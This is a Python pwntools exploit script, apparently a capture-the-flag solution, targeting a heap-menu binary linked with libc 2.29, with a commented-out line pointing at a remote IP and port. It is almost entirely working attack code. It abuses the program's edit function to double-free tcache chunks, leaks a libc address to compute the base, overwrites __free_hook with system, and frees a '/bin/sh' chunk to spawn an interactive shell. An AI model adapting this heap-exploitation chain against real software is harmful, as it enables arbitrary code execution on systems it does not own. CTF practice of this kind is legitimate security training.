from pwn import*
def add(name,info):
	p.sendlineafter('choice : ','1')
	p.sendafter('name',name)
	p.sendafter('sex','M')
	p.sendafter('information',info)
	##Chunk -> name|sex|info = 0x80 

def show(index):
	p.sendlineafter('choice : ','2')
	p.sendlineafter('index : ',str(index))

def edit(index,info):
	p.sendlineafter('choice : ','3')
	p.sendlineafter('index : ',str(index))
	p.sendafter('sex?','Y\0')
	p.sendafter('information',info)

def free(index):
	p.sendlineafter('choice : ','4')
	p.sendlineafter('index : ',str(index))
#p = remote('123.56.85.29',4807)
p = process('./pwn')
libc = ELF('./libc-2.29.so')
context.log_level = 'debug'
add(p64(0),'\x00'*0x70)
add(p64(1),'\x00'*0x70)
add(p64(2),'\x00'*0x70)
add(p64(3),'\x00'*0x70)
free(3)
edit(3,'\x00'*0x70)
free(3)

free(2)
edit(2,'\x00'*0x70)
free(2)

free(1)
edit(1,'\x00'*0x70)

free(0)
edit(0,'\x00'*0x70)
free(0)

free(1)
show(1)
p.recvline()
malloc_hook = u64(p.recv(6).ljust(8,'\x00'))  - 0x70
libcbase = malloc_hook - libc.sym['__malloc_hook']
log.success('LibcBase:\t' + hex(libcbase))
free_hook = libcbase + libc.sym['__free_hook']
system = libcbase + 0x71FF0
add(p64(free_hook),'\x00'*0x70)
add('/bin/sh\x00','\x00'*0x70)
add(p64(system),'\x00'*0x70)
free(5)
p.interactive()